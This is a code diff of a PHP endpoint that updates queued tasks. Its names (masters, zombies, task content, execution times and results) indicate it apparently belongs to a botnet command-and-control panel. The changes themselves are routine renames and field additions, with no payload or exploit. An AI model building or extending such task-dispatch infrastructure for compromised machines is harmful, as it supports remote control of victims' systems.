@@ -19,7 +19,7 @@ include_once 'config/database.php';
 include_once 'objects/task.php';
 
 // auxilar functions
-include_once 'aux_functions/check_permission.php';
+include_once 'util/check_permission.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -37,10 +37,10 @@ if($jwt){
         $decoded = JWT::decode($jwt, $key, array('HS256'));
         // Check who request and permission
         $requested_by = $decoded->data->username;
-        $to_update = $data->username;
+        $to_update = $data->master_username;
 
-        if (is_zombie($requested_by)){
-            $task->readed = $data->readed;
+        if (is_zombie($db, $requested_by)){
+            $task->read_confirm = $data->read_confirm;
             $task->running = $data->running;
             $task->result = $data->result;
             $task->exec_at = $data->exec_at;
@@ -50,13 +50,14 @@ if($jwt){
             // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
             check_master_permissions($requested_by);
             // set task to update property values
+            $task->mission_id = $data->mission_id;
             $task->task_type = $data->task_type;
             $task->task_content = $data->task_content;
-            $task->master_username = $data->master_username;
+            //$task->master_username = $data->master_username;
             $task->to_exec_at = $data->to_exec_at;
             $task->to_stop_at = $data->to_stop_at;
             $task->zombie_username = $data->zombie_username;
-            $task->readed = $data->readed;
+            $task->read_confirm = $data->read_confirm;
             $task->running = $data->running;
             $task->result = $data->result;
             $task->exec_at = $data->exec_at;
